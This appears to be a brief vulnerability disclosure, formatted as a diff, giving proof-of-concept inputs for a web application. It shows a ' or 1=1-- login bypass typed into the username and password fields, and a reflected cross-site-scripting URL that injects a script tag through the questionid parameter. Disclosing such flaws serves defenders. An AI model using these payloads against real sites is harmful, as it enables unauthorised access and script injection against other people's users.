@@ -1,0 +1,5 @@
+For the SQL-injection vulnerabilities:
+goto login section .. and put in user name &#039; or 1=1-- and in pass &#039; or 1=1-- 
+
+For the cross-site-scripting vulnerability:
+www.example.com/[path]/questiondetail.php?questionid=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
